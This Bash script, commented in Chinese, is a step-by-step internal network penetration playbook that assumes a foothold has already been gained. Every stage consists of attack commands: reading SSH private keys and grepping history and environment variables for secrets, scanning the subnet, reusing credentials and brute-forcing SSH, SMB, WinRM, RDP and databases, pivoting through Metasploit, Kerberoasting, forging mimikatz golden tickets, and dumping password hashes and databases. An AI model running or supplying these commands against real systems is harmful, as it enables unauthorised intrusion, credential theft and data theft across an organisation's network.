#!/bin/bash
# 内网渗透实战脚本 - 从外网入口到内网横向

echo "[+] ========================================"
echo "[+] 内网渗透实战 - 完整流程"
echo "[+] ========================================"

# 假设已获得初始shell，进行内网渗透

echo ""
echo "[+] 阶段1: 信息收集（5分钟）"
echo "[+] -------------------------"

cat << 'INFO'
# 在目标机器上执行：

# 系统信息
uname -a
hostname
id
whoami
cat /etc/os-release

# 网络信息
ip addr
ip route
cat /etc/resolv.conf
netstat -antlp
ss -antlp

# 进程和服务
ps aux
systemctl list-units --type=service

# 凭证收集
cat ~/.ssh/id_rsa
cat ~/.bash_history | grep -i "password\|ssh"
env | grep -i "pass\|key\|token"
INFO

echo ""
echo "[+] 阶段2: 内网扫描（定位高价值目标）"
echo "[+] -------------------------"

cat << 'SCAN'
# C段扫描
for i in {1..254}; do
    timeout 1 bash -c "ping -c 1 192.168.1.$i > /dev/null 2>&1 && echo 192.168.1.$i" &
done | sort -u > alive_hosts.txt

# 端口扫描（关键服务）
nmap -p 22,80,443,3306,6379,27017,3389,445,5985,5986 -iL alive_hosts.txt --open -oN ports_scan.txt

# 服务识别
nmap -sV -sC -p- -iL alive_hosts.txt -oN service_scan.txt
SCAN

echo ""
echo "[+] 阶段3: 横向移动（凭证复用）"
echo "[+] -------------------------"

cat << 'LATERAL'
# SSH密钥复用
for ip in $(cat alive_hosts.txt); do
    ssh -i id_rsa -o ConnectTimeout=3 root@$ip "hostname" 2>/dev/null && echo "[+] $ip - SSH成功"
done

# SMB横向（Windows）
crackmapexec smb 192.168.1.0/24 -u administrator -p 'password' --shares

# WinRM横向
crackmapexec winrm 192.168.1.0/24 -u administrator -p 'password'

# RDP横向
hydra -L users.txt -P passwords.txt rdp://192.168.1.100

# 数据库横向
mysql -h 192.168.1.100 -u root -p'password' -e "SELECT VERSION();"
redis-cli -h 192.168.1.100 -a password
LATERAL

echo ""
echo "[+] 阶段4: MSF内网穿透"
echo "[+] -------------------------"

cat << 'MSF'
# MSF Console中执行：

# 1. 添加路由
run autoroute -s 192.168.1.0/24
route add 192.168.1.0 255.255.255.0 1

# 2. 通过路由扫描
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 445,3389,5985
set ROUTE_THROUGH_SESSION 1
run

# 3. SOCKS代理
use auxiliary/server/socks_proxy
set VERSION 5
set SRVPORT 1080
run

# 4. 使用proxychains
# /etc/proxychains.conf: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 192.168.1.100
MSF

echo ""
echo "[+] 阶段5: 域环境攻击（如适用）"
echo "[+] -------------------------"

cat << 'AD'
# BloodHound收集
SharpHound.exe -c All,GPOLocalGroup -d domain.local --zipfilename bh.zip

# Kerberoasting
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.1 -request

# AS-REP Roasting
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt

# 黄金票据
mimikatz "lsadump::dcsync /domain:domain.local /user:krbtgt"
mimikatz "kerberos::golden /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /user:administrator /id:500 /ptt"
AD

echo ""
echo "[+] 阶段6: 数据收集"
echo "[+] -------------------------"

cat << 'DATA'
# 敏感文件
find / -name "*.key" -o -name "*.pem" -o -name "*password*" 2>/dev/null
find / -name ".env" -o -name "config.php" 2>/dev/null

# 数据库导出
mysqldump -u root -p database_name > dump.sql

# 凭证收集
hashdump
load kiwi
kiwi_cmd "sekurlsa::logonpasswords"
DATA

echo ""
echo "[+] ========================================"
echo "[+] 完整流程完成"
echo "[+] ========================================"
